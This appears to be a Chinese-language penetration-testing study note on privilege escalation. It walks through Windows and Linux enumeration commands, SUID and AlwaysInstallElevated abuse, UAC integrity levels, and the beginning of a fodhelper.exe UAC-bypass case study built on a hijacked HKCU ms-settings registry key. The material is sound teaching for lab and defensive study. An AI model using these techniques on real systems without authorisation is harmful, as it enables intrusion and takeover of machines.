# 16-Privilege Escalation

## 信息收集

### 手动枚举

#### 枚举用户

`whoami` 是一个通用的命令

windows下，可以用 `net user` 进行查看用户信息。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606379660151-5cf2226d-df2a-4126-836d-3a8accdb3141.png)

基于Linux的系统，可以用 `id` 进行收集用户信息：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606379893618-66fd1ebe-9cca-4ac2-a0ed-73780b96b4b1.png)

`net user` 不带任何信息，就可以输出其它的用户账户

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380002049-3ccc66ee-57a9-41c4-abb3-e52b6ccc3423.png)

linux下，直接读取/etc/passwd文件即可：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380033250-fd111e46-73c3-473e-b5f7-3d78fc47f906.png)

passwd文件列出了几个用户帐户，包括目标计算机上各种服务（如www data）使用的帐户，这表明可能安装了web服务器。

枚举目标计算机上的所有用户有助于识别潜在的高权限用户帐户，我们可以针对这些帐户尝试提升权限。

#### 枚举主机名

计算机的主机名通常可以提供有关其功能角色的线索。主机名通常包括可识别的缩写，例如web服务器的web、数据库服务器的db、域控制器的dc等。

利用 `hostname` 命令，通用。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380180128-bdc4c654-bbf1-49a6-bedf-ce81320fb5f4.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380191821-cc03068b-e8c5-4034-8ac5-4ac968a669dd.png)

#### 枚举操作系统版本和体系结构

在权限提升过程中的某个时刻，我们可能需要依赖内核漏洞攻击，这些漏洞专门利用目标操作系统核心中的漏洞。这些类型的攻击是为特定类型的目标而构建的，由特定的操作系统和版本组合指定。由于使用不匹配的内核漏洞攻击目标会导致系统不稳定（导致访问丢失，并可能会警告系统管理员），因此我们必须收集有关目标的精确信息。

在Windows操作系统上，我们可以使用 `systeminfo` 实用程序收集特定的操作系统和体系结构信息。

我们还可以使用 `findstr` 和一些有用的标志来过滤输出。具体来说，我们可以用/B匹配行首的模式，并使用/C:指定特定的搜索字符串。

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380537553-f4666f05-fc34-4134-9a79-317b3c754291.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380570004-c04bc9d2-7666-437e-92a8-2d7608e7425b.png)

在Linux上， `/etc/issue` 和 `/etc/*-release` 文件包含类似的信息。我们也可以发出 `uname -a` 命令：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380736020-e29f7c1a-c5b8-4867-a2a9-aa88cd2a6d27.png)

#### 枚举正在运行的进程和服务

我们可以用 `tasklist` 命令列出Windows上正在运行的进程。 `/SVC` 标志将返回映射到特定Windows服务的进程。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380856144-48a37fd9-ea35-48cf-877c-5e8c3759d749.png)

在Linux上，我们可以使用 `ps` 命令列出系统进程（包括特权用户运行的进程）。我们将使用 a 和 x 标志列出带有或不带有tty的所有进程，使用 u 标志以用户可读的格式列出进程。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606380983740-636c1af9-56f9-4a0e-a317-12605da3affd.png)

#### 枚举网络信息

我们可以使用 `ipconfig` 开始在Windows操作系统上收集信息，使用 `/all` 标志显示所有适配器的完整TCP/IP配置。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381156962-cc03e173-7bb8-4399-837a-05c96ac7d30a.png)

为了显示网络路由表，我们将使用 `route` 命令和 `print` 参数。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381257305-7af6f34c-4cbb-4c33-ba8a-2e68f80c3d48.png)

最后，我们可以使用 `netstat` 来查看活动的网络连接。指定 a 标志将显示所有活动的TCP连接，n 标志允许我们以数字形式显示地址和端口号，o 标志将显示每个连接的所有者PID。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381336365-142cf4cb-9ffa-4ed3-87fd-04a3f3978001.png)

`netstat` 不仅向我们提供了机器上所有监听端口的列表，还包括有关已建立连接的信息，这些信息可能会显示连接到这台机器的其他用户，我们以后可能会将其作为目标。

在基于Linux的主机上也可以使用类似的命令。根据Linux的版本，我们可以列出每个网络适配器的TCP/IP配置，其中包括 `ifconfig` 或 `ip` 。这两个命令都接受 a 标志以显示所有可用信息。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381479685-0cbde38c-934c-42cd-b32e-f51ec1bf585c.png)

根据Linux风格和版本，我们可以使用 `route` 或 `routel` 显示网络路由表。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381579180-a75b2324-9728-4e96-82ca-b32f005dd984.png)

最后，我们可以用 `netstat` 或 `ss` 来显示活动的网络连接和监听端口，这两个端口都接受相同的参数。

例如，我们可以用 `-a` 列出所有连接，用 `-n` 避免主机名解析（这可能会暂停命令执行），并用 `-p` 列出连接所属的进程名。我们可以合并参数，只需运行 `ss -anp` ：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606381868070-3ddaf7d4-0238-4673-a20c-c8a097b648a1.png)

#### 枚举防火墙状态和规则

一般来说，防火墙的状态、配置文件和规则只在评估的远程利用阶段感兴趣。但是，此信息在权限提升期间可能很有用。例如，如果网络服务由于被防火墙阻止而无法远程访问，则通常可以通过环回接口在本地访问该服务。如果我们可以在本地与这些服务交互，我们就可以利用它们来提升我们在本地系统上的权限。

此外，在这个阶段，我们可以收集有关入站和出站端口筛选的信息，以便在需要转到内部网络时进行端口转发和隧道传输。

在Windows上，我们可以使用 `netsh` 命令检查当前的防火墙配置文件。

```
netsh advdirewall show currentprofile
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606382010300-bbf1234b-0ddb-4759-84fd-563740a33216.png)

在本例中，当前的防火墙配置文件是活动的，所以让我们仔细看看防火墙规则。

我们可以使用 `netsh` 命令使用以下语法列出防火墙规则：

```
netsh advfirewall firewall show rule name=all
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606382196317-b45a5d49-3ed8-4c9a-88a3-98428858ee8c.png)

在基于Linux的系统上，我们必须具有root权限才能使用 `iptables` 列出防火墙规则。然而，根据防火墙的配置方式，作为一个标准用户，我们可能能够收集有关规则的信息。

我们还可以搜索 `iptables save` 命令创建的文件，该命令用于将防火墙配置转储到用户指定的文件中。然后，该文件通常用作 `iptables restore` 命令的输入，并用于在引导时还原防火墙规则。如果系统管理员曾经运行过这个命令，我们可以搜索配置目录（/etc）或grep文件系统中的iptables命令来定位该文件。如果文件具有不安全的权限，我们可以使用这些内容来推断系统上运行的防火墙配置规则。

#### 枚举计划任务

攻击者通常在权限提升攻击中利用计划任务。

作为服务器的系统通常定期执行各种自动化、计划的任务。这些服务器上的调度系统通常有一些混乱的语法，用于执行用户创建的可执行文件或脚本。当这些系统配置错误，或者用户创建的文件没有安全权限时，我们可以修改这些文件，这些文件将由调度系统在高权限级别执行。

我们可以使用 `schtasks` 命令在Windows上创建和查看计划任务。 `/query` 参数显示任务， `/FO LIST` 将输出格式设置为简单列表。我们还可以使用 `/V` 请求详细的输出。

```
schtasks /query /fo LIST /v
```

效果类似下面这个，我的靶机上出了错误：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606382778624-4d953a11-f51e-4bd9-8d72-09fedbe93985.png)

`schtasks` 生成的输出包含许多有用的信息，例如要运行的任务、下一次运行的时间、上次运行的时间以及运行频率的详细信息。

基于Linux的作业调度程序称为Cron。计划任务列在 `/etc/cron.*` 目录下，其中*表示任务运行的频率。例如，每天运行的任务可以在/etc下找到 `/cron.daily` . 每个脚本都列在它自己的子目录中。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606382947775-e0e72858-6bd2-4b1a-bbf7-ef07665354c3.png)

在列出目录内容时，我们注意到有几个任务计划每天运行。

值得注意的是，系统管理员经常在 `/etc/crontab` 文件中添加他们自己的计划任务。应该仔细检查这些任务是否具有不安全的文件权限，因为此特定文件中的大多数作业将以根用户身份运行。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606387595002-47026ddc-056b-4b33-9b3e-13dff1eae8f9.png)

这个例子展示了一个以root用户身份运行的备份脚本。如果此文件具有弱权限，我们可以利用它来提升我们的权限。

#### 枚举已安装的应用程序和修补程序级别

在某些时候，我们可能需要利用漏洞来提升我们的本地权限。如果是这样的话，我们将从枚举所有已安装的应用程序开始寻找有效的漏洞，并注明每个应用程序的版本（以及基于Windows的系统上的操作系统修补程序级别）。我们可以使用此信息搜索匹配的攻击。

`wmic` 实用程序提供对Windows管理工具的访问，后者是Windows上管理数据和操作的基础设施。

我们可以将 `wmic` 与 `product` WMI类参数一起使用，后跟 `get` ，顾名思义，get用于检索特定的属性值。然后我们可以选择我们感兴趣的属性，例如名称、版本和供应商。

要记住的一件重要事情是， `product` WMI类只列出了由Windows安装程序安装的应用程序。它不会列出不使用Windows安装程序的应用程序。

```
wmic product get name, version, vendor
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606387930980-749e1c32-864a-4243-809c-4d6ee2200bb6.png)

同样，更重要的是，wmic还可以通过查询Win32_QuickFixEngineering（qfe）wmi类来列出系统范围的更新。

```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606388091555-7f093298-fab5-4d26-ad51-febf8e1dad5e.png)

HotFixID和InstalledOn信息的组合可以为我们提供目标Windows操作系统的安全态势的精确指示。根据这个输出，这个系统最近没有更新，这可能会使它更容易被利用。

基于Linux的系统使用各种包管理器。例如，基于Debian的Linux发行版使用dpkg，而基于redhat的系统使用rpm。

要列出Debian系统上安装的应用程序（由dpkg安装），我们可以使用 `dpkg -l` 。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606388181894-aa7f6c78-78b4-4e37-a5d7-a4de23537b89.png)

#### 枚举可读写文件和目录

如前所述，访问限制不足的文件可能会创建一个漏洞，该漏洞可授予攻击者提升的权限。当攻击者可以修改在特权帐户上下文下执行的脚本或二进制文件时，通常会发生这种情况。

有许多实用程序和工具可以在Windows平台上为我们自动执行此任务。SysInternals中的AccessChk可以说是最著名、最常用的工具。

> AccessChk：https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk

我们将使用 `-u` 来抑制错误， `-w` 用于搜索写访问权限，使用 `-s` 执行递归搜索。其他选项也值得探讨，因为这个工具非常有用。

我的电脑上没有，所以没有查询出结果。

```
accesschk.exe -uws "Everyone" "C:\Program Files"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606391608842-8b366bbd-0f16-4381-8ddc-d51eefb591f1.png)

如果有的话，会有下面的效果：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606391659595-9ba56fdb-1548-4d57-9d83-f3a4c0b9c120.png)

我们也可以使用PowerShell实现相同的目标。这在我们可能无法在目标系统上传输和执行任意二进制文件的情况下非常有用。

```
Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606391895040-12ad26a7-ecd3-4f97-9eb2-d0a064af98e3.png)

在Linux操作系统上，我们可以使用 `find` 来识别具有不安全权限的文件。

在下面的示例中，我们搜索目标系统上当前用户可写的每个目录。我们搜索整个根目录（/）并使用 `-writable` 参数指定我们感兴趣的属性。我们还使用 `-typed` 来定位目录，并使用 `2>/dev/null` 过滤错误：

```
find / -writable -type d 2>/dev/null
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606392157715-9bff6c10-239b-4a2f-b869-bb41d84293dc.png)

#### 枚举未装载的磁盘

在大多数系统中，驱动器是在引导时自动安装的。因此，很容易忘记未安装的驱动器，这些驱动器可能包含有价值的信息。我们应该始终查找未装载的驱动器，如果存在，请检查装载权限。

在基于Windows的系统上，我们可以使用 `mountvol` 列出当前安装的所有驱动器以及物理连接但未安装的驱动器。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606392275013-0e81053e-e9e1-4d58-b25e-d3db2d8a6bae.png)

在基于Linux的系统上，我们可以使用 `mount` 命令列出所有挂载的文件系统。此外， `/etc/fstab` 文件列出了引导时将安装的所有驱动器。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606392335374-8ac190e2-0d70-43c5-ab6f-58703da12d66.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606392355852-1272e11a-d810-4703-ba3d-436bf976f6b5.png)

我们可以使用 `lsblk` 查看所有可用磁盘。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606392500495-84832587-afdf-489d-b8c7-c8a636256ef9.png)

#### 枚举设备驱动程序和内核模块

另一种常见的权限提升涉及设备驱动程序和内核模块的攻击。我们将在本模块后面介绍实际的利用技术，但让我们看一看重要的枚举技术。由于该技术依赖于将漏洞与相应漏洞进行匹配，因此我们需要编译一个加载到目标上的驱动程序和内核模块的列表。

在Windows上，我们可以用 `driverquery` 命令开始搜索。我们将为详细输出提供 `/v` 参数，以及 `/fo csv` 以csv格式请求输出。

为了过滤输出，我们将在PowerShell会话中运行此命令。在PowerShell中，我们将输出通过管道传输到 `ConvertFrom Csv` cmdlet以及 `Select Object ` ，这将允许我们选择特定的对象属性或对象集，包括显示名称、启动模式和路径。

```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
```

ConvertFrom-CSV会报错，所以就看一下前面的效果吧，后面的就是过滤的：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606393763798-7240f0dd-12a6-477c-b208-d34e608f34b9.png)

类似这种效果：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606393817761-8f335f37-da72-40d7-bd18-32fbf86ec960.png)

虽然这产生了一个已加载驱动程序的列表，但我们必须采取另一个步骤来请求每个加载的驱动程序的版本号。我们将使用 `Get-WmiObject` cmdlet获取Win32_pnpsignedriver WMI实例，该实例提供有关驱动程序的数字签名信息。通过管道输出到 `Select Object` ，我们可以枚举特定属性，包括驱动版本。此外，我们可以通过管道将输出发送到 `Where-Object` ，从而根据驱动程序的名称来确定驱动程序的目标.

```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606394569629-2731e232-65cb-4d61-8bb6-06c0dc8076ba.png)

在Linux上，我们可以使用 `lsmod` 枚举加载的内核模块，而不需要任何额外的参数。![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606394641753-4201b63b-b2a7-403c-bb39-8b6ec97bf6ab.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606394840670-d491ae86-a249-498a-9374-0182c14c6ca5.png)

一旦我们有了已加载模块的列表并确定了需要更多信息的模块，比如上面示例中的libata，我们就可以使用 `modinfo` 来了解有关特定模块的更多信息。请注意，此工具需要完整的路径名才能运行。

```
/sbin/modinfo libata
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606394888912-a861a06f-9210-469f-bcc0-317a7912dd0f.png)

#### 枚举自动升级的二进制文件

在本模块的后面，我们将探讨各种权限提升方法。然而，在本节中，我们应该讨论一些特定于操作系统的枚举，它们可以揭示特权提升的有趣的特定于操作系统的“捷径”。

首先，在Windows系统上，我们应该检查AlwaysInstallElevated注册表设置的状态。如果在计算机中启用了HKEY_CURRENT_USER或HKEY_LOCAL_MACHINE（设置为1），则任何用户都可以使用提升的权限运行Windows Installer软件包。下面的命令我没有成功，提示系统找不到指定的注册表。

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606396230040-41aefd98-500b-42b3-b2e5-fda750627435.png)

如果启用了这个设置，我们可以创建一个MSI文件并运行它来提升我们的特权。

类似地，在基于Linux的系统上，我们可以搜索suid文件。

通常，在运行可执行文件时，它继承运行它的用户的权限。但是，如果设置了SUID权限，则二进制文件将以文件所有者的权限运行。这意味着，如果一个二进制文件设置了SUID位，并且该文件属于root用户，则任何本地用户都可以使用提升的权限执行该二进制文件。

我们可以使用find命令搜索SUID标记的二进制文件。在本例中，我们从根目录（/）开始搜索，查找SUID位设置为（-perm -u=s）的文件（-type f），并丢弃所有错误消息（2>/dev/null）：

```
find / -perm -u=s -type f 2>/dev/null
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606396490180-0b10abbc-3c53-4ee8-bff7-f58aa59d3f3b.png)

在本例中，命令找到了几个SUID二进制文件。SUID二进制文件的利用将因几个因素而有所不同。例如，如果/bin/cp（copy命令）是SUID，我们可以复制和覆盖敏感文件，如/etc/passwd。

### 自动枚举

在Windows上，一个这样的脚本是windows-privesc-check，可以在windows-privesc-check Github存储库中找到。仓库已经包含了一个由PyInstaller生成的Windows可执行文件，但也可以根据需要重新构建它。

> https://github.com/pentestmonkey/windows-privesc-check

运行带有 `-h` 标志的可执行文件将显示以下帮助菜单：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606397389661-70335c83-10f1-4c52-b38d-48ef89ff9593.png)

这个工具接受许多选项，但是我们将简单介绍一些示例。首先，我们将列出有关系统上用户组的信息。我们将指定 `--dump` 来查看输出，并指定 `-G` 来列出组。

```
windows-privesc-check2.exe --dump -G
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606397504773-bb911449-a576-4d53-9498-f3514c601189.png)

与windows目标上的windows-privesc-check类似，我们也可以在unix衍生工具（如Linux）上使用unix_privesc_check。我们可以通过运行不带任何参数的脚本来查看工具帮助。

> http://pentestmonkey.net/tools/audit/unix-privesc-check

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606399155166-54d9630a-df0e-49ae-82bd-f996451b3b52.png)

如上面的清单所示，脚本支持“标准”和“详细”模式。根据所提供的信息，标准模式似乎在执行速度优化的过程，并且应该提供较少的误报。因此，在下面的示例中，我们将使用标准模式并将整个输出重定向到名为otput.txt.

```
./unix-privesc-check standard > output.txt
```

该脚本对公共文件执行多次权限检查。例如，以下摘录显示了非root用户可写的配置文件：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606399332262-61ac6caf-998a-48a2-85e4-1905d6715c51.png)

## Windows权限提升示例

在本节中，我们将讨论Windows特权、完整性机制和用户帐户控制（UAC）。我们将演示UAC绕过技术，并利用内核驱动程序漏洞、不安全的文件权限和未加引号的服务路径来提升我们在目标系统上的权限。

### 了解Windows权限和完整性级别

Windows操作系统上的权限是指特定帐户执行与系统相关的本地操作的权限。这包括修改文件系统、添加用户、关闭系统等操作。

为了使这些特权有效，Windows操作系统使用称为访问令牌的对象。496一旦用户通过身份验证，Windows将生成一个访问令牌分配给该用户。令牌本身包含各种信息，这些信息有效地描述了给定用户的安全上下文，包括用户权限。

最后，考虑到它们包含的信息，这些令牌需要是唯一可识别的。这是使用安全标识符或SID来完成的，SID是分配给每个对象（包括令牌）的唯一值，例如用户或组帐户。

这些SID由Windows本地安全机构生成和维护。

除了特权之外，Windows还实现了所谓的完整性机制。这是Windows安全体系结构的核心组件，通过为应用程序进程和安全对象分配完整性级别来工作。简单地说，这描述了操作系统在运行应用程序或安全对象时的信任级别。例如，配置的完整性级别指示应用程序可以执行的操作，包括读取或写入本地文件系统的能力。API也可以从特定的完整性级别阻止。

从Windows Vista开始，进程在四个完整性级别上运行：

• System integrity process: SYSTEM rights

• High integrity process: administrative rights

• Medium integrity process: standard user rights

• Low integrity process: very restricted rights often used in sandboxed processes

### 用户帐户控制（UAC）简介

用户帐户控制（UAC是微软在window svista和windows server 2008中引入的一种访问控制系统。虽然UAC已经被讨论和调查了很长一段时间，但必须强调的是，微软并不认为它是一个安全边界。相反，UAC强制应用程序和任务在非管理帐户的上下文中运行，直到管理员授权提升的访问权限。它将阻止安装程序和未经授权的应用程序在没有管理帐户权限的情况下运行，并阻止对系统设置的更改。一般来说，UAC的效果是，任何希望执行对系统有潜在影响的操作的应用程序都不能安静地执行。至少在理论上。

还需要强调的是，UAC有两种不同的模式：凭证提示和同意提示。区别很简单。当标准用户希望执行管理任务（如安装新应用程序）并且启用了UAC时，用户将看到凭证提示。换句话说，需要管理用户的凭据才能完成任务。但是，当管理用户尝试执行相同操作时，他或她将出示同意提示。在这种情况下，用户只需确认任务应该完成，不需要重新输入用户凭证。

例如，在下图中，在标准用户帐户下运行的Windows命令处理器正在尝试执行特权操作。UAC根据其通知设置（在这种情况下总是通知）来操作，暂停目标进程cmd.exe并提示输入管理员用户名和密码以执行请求的特权操作。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606402551802-615fffba-0893-4a5d-9b92-fc39472f1766.png)

即使以管理用户身份登录，帐户也会有两个安全令牌，一个在中等完整性级别运行，另一个在高完整性级别运行。UAC充当这两个完整性级别之间的分离机制。

要查看实际的完整性级别，首先以admin用户身份登录，打开命令提示符，然后运行 `whoami /groups` 命令：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403076845-bab3a782-7f3d-482c-b06e-24c518aa4b84.png)

可以看到最后一行，我们当前是一个Medium级别的完整性级别，然后我们尝试修改用户的密码。

```
net user soft98 www.soft98.top
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403149402-77f2961b-3516-4135-b966-861dba3048a7.png)

请求被拒绝，即使我们以管理用户身份登录。

为了更改管理员用户的密码，即使使用管理用户登录，我们也必须切换到高完整性级别。在我们的示例中，一种方法是通过powershell.exe使用Start Process  cmdlet指定“以管理员身份运行”选项：

```
powershell.exe Start-Process cmd.exe -Verb runAs
```

会出现一个UAC提示，我们同意之后会弹出一个以管理员身份运行的cmd.exe：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403358404-c37e020a-45b5-448b-ac31-975e6884063b.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403393703-d92a287d-15f1-4d4d-820b-768a6564232b.png)

这时候我们再用 `whoami /groups` 查看一下，会发现是在高完整性等级之下

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403435584-6d9442e0-c529-40ad-8540-d8e97a1a3663.png)

这时候再执行修改用户密码：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606403497250-7174cb59-c583-4be2-919d-9749f3cacfe4.png)

### 用户帐户控制（UAC）Bypass：fodhelper.exe文件案例研究

UAC可以通过各种方式绕过。在第一个示例中，我们将演示一种技术，它允许管理员用户通过静默地将完整性级别从中提升到高来绕过UAC。

大多数已知的UAC bypass技术都针对特定的操作系统版本。在本例中，目标是运行Windows10 Build1709的实验室客户端。我们将利用一个有趣的UAC bypass基于fodhelper.exe文件，Microsoft支持应用程序，负责管理操作系统中的语言更改。具体来说，只要本地用户在“应用程序和功能”Windows设置屏幕中选择“管理可选功能”选项，就会启动此应用程序。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606441780898-e9927480-55c5-47cd-ace4-dd4c6694c798.png)

我们将很快证明fodhelper.exe二进制文件在Windows 10 1709上作为高完整性运行。由于fodhelper与Windows注册表交互的方式，我们可以利用它绕过UAC。更具体地说，它与注册表项交互，这些注册表项可以在没有管理权限的情况下进行修改。我们将尝试查找和修改这些注册表项，以便以高完整性运行我们选择的命令。

Windows注册表是存储操作系统和选择使用它的应用程序的关键信息的分层数据库。注册表在配置单元、键、子键和值的层次树结构中存储设置、选项和其他杂项信息。

我们将从运行C:\Windows\System32开始分析\fodhelper.exe文件二进制文件，显示“管理可选功能设置”窗格：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606441881198-3e8321f7-f61c-4538-9f15-1c6e73eb763b.png)

为了收集有关fodhelper完整性级别和运行此进程所需权限的详细信息，我们将检查其应用程序清单。应用程序清单是一个XML文件，其中包含的信息使操作系统知道如何在程序启动时处理程序。我们将使用Sysinternals中的 `sigcheck` 实用程序检查清单，传递 `-a` 参数以获取扩展信息，传递 `-m` 以转储清单。

```
cd C:\Tools\privilege_escalation\SysinternalsSuite
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606441943919-5a7af713-75f0-4f7f-8b58-0462cd8900e9.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442003664-a364594b-2be4-40d3-ab7e-2e6e1124a440.png)

快速查看结果可以发现，应用程序是由管理用户运行的，因此，需要管理员完全访问令牌。此外， `autoelevate` 标志设置为true，这允许可执行文件自动提升到高完整性，而无需提示管理员用户同意。

我们可以使用Sysinternals套件中的 `processmonitor` 来收集关于这个工具的更多信息。

当我们的目标是了解特定进程如何与文件系统和Windows注册表交互时，进程监视器是一个非常宝贵的工具。它是一个很好的工具来识别缺陷，如注册表劫持，DLL劫持等等。

启动后procmon.exe程序，我们就运行fodhelper.exe文件再次设置过滤器，专门关注目标流程执行的活动。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442127572-5b8db3e3-75b1-44fd-8cb7-b40fd38a0285.png)

此过滤器显著减少了输出，但对于此特定漏洞，我们只关心此应用程序如何与当前用户可以修改的注册表项交互。为了缩小搜索结果的范围，我们将使用搜索“Reg”来调整过滤器，Procmon使用它来标记注册表操作。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442171934-15e3d43f-d0e5-4ea8-a102-32bb785833bd.png)

一旦我们添加了新的过滤器，我们应该只看到注册表操作的结果。下图显示了流程监视器由于我们的两个过滤器而减少的输出。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442197597-c9520fdd-40ea-4aae-91e0-0e99f79864a5.png)

这些都是更容易管理的结果，但我们希望进一步缩小我们的重点。具体地说，我们想看看fodhelper应用程序是否试图访问不存在的注册表项。如果是这种情况，并且这些注册表项的权限允许，我们可能会篡改这些条目，并可能干扰目标高完整性进程正在尝试执行的操作。

为了再次缩小搜索范围，我们将重新运行应用程序，并为“找不到名称”添加一个“结果”筛选器，这是一条错误消息，指示应用程序试图访问不存在的注册表项。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442252081-de4d8276-197d-4a8d-ae69-af31c547623d.png)

结果显示fodhelper.exe文件实际上，会生成“找不到名称”错误，这是一个潜在的可利用注册表项的指示器。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442283032-6b11a909-6179-4225-a4b4-ff016e91edc9.png?x-oss-process=image%2Fresize%2Cw_1500)

但是，由于我们不能任意修改每个配置单元中的注册表项，所以我们需要关注我们可以控制的注册表配置单元。在本例中，我们将重点关注HKEY_CURRENT_USER（HKCU）配置单元，我们作为当前用户，对其具有读写访问权限：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442328002-79820e14-2d64-4072-b35e-6f9ebf3a6a42.png)

应用此附加过滤器将产生以下结果：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442345759-3fbcc57d-ecff-4455-95f1-d9a870e3b90c.png?x-oss-process=image%2Fresize%2Cw_1500)

根据这个输出，我们看到了一些相当有趣的东西。这个fodhelper.exe文件应用程序试图查询似乎不存在的HKCU:\Software\Classes\ms settings\shell\open\command注册表项。

为了更好地理解发生这种情况的原因以及这个注册表项的具体用途，我们将修改路径下的检查，并特别查找对包含ms-settings\shell\open\command的条目的任何访问。如果进程能够成功地访问其他蜂箱中的密钥，那么结果将为我们提供更多线索。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442443890-251d6132-53c3-4fa2-8b53-32866f40fd92.png)

这个输出包含一个有趣的结果。当fodhelper在HKCU中找不到ms-settings\shell\open\command注册表项时，它会立即尝试访问HKEY_CLASSES_ROOT (HKCR)配置单元中的同一项。由于该条目确实存在，所以访问成功。

如果我们寻找HKCR:ms-settings\shell\open\command在注册表中，我们找到一个有效的条目：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442573622-372483ea-8c8a-436b-9666-31b82bcbb3cb.png)

基于此观察结果，并在MSDN文档519中搜索此注册表项格式（application-name\shell\open）后，我们可以推断fodhelper正在通过ms-Settings:application protocol打开Windows设置应用程序的一部分（很可能是fodhelper启动时呈现给用户的管理可选功能）。Windows的应用协议定义了当程序使用特定URL时要启动的可执行文件。这些URL-Application映射可以通过类似于我们在HKCR中找到的ms-setting键的注册表项来定义（上面的图）。在这种特殊情况下，ms-settings的应用协议模式将执行传递给COM对象，而不是程序。这可以通过将DelegateExecute键值设置为特定的COM类ID来实现，如MSDN文档中所述。

这绝对有趣，因为fodhelper首先尝试访问HKCU配置单元中的ms-setting注册表项。进程监视器先前的结果清楚地显示，HKCU不存在此密钥，但我们应该拥有创建它所需的权限。这可以让我们通过一个格式正确的协议处理程序来劫持执行。让我们尝试使用REG实用程序添加此密钥：

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
```

添加注册表项后，我们将清除ProcessMonitor中的所有结果（使用图中突出显示的图标），重新启动fodhelper.exe文件，并监视流程活动：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1606442828821-7c8933e0-f5bc-4784-b2bc-97d31e81d9a5.png?x-oss-process=image%2Fresize%2Cw_1500)

请注意，清除输出显示不会清除我们创建的过滤器。它们被保存了，我们不需要重新创建它们。

